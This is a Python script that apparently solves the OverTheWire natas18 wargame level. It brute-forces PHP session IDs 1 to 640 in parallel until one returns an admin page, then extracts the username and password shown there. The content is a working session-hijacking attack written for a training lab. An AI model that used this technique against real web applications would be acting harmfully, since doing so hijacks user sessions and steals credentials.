import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import re
import threading
import string

url = "http://natas18.natas.labs.overthewire.org/index.php"
headers = {
    "Authorization": "your_token",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
}

found = False
found_credentials = None
lock = threading.Lock()

def check_session(session_id):
    global found, found_credentials
    if found:
        return None  
    cookies = {"PHPSESSID": str(session_id)}
    response = requests.get(url, headers=headers, cookies=cookies) 
    if "You are an admin" in response.text:
        with lock:
            if not found:
                found = True
                print(f"[+] Admin session found! PHPSESSID={session_id}")
                match = re.search(r'Username: (\S+)\nPassword: ([a-zA-Z0-9]+)', response.text)
                if match:
                    found_credentials = match.groups()
                    print(f"[+] Extracted Credentials: Username={found_credentials[0]}, Password={found_credentials[1]}")
        return session_id
    else:
        print(f"[-] Trying session {session_id}...")
        return None

with ThreadPoolExecutor(max_workers=20) as executor:
    futures = {executor.submit(check_session, session_id): session_id for session_id in range(1, 641)}
    
    for future in as_completed(futures):
        if future.result() is not None:
            found = True  
            break

if found_credentials:
    print(f"[RESULT] Found credentials - Username: {found_credentials[0]}, Password: {found_credentials[1]}")
else:
    print("[-] Brute-force completed: No admin session found.")

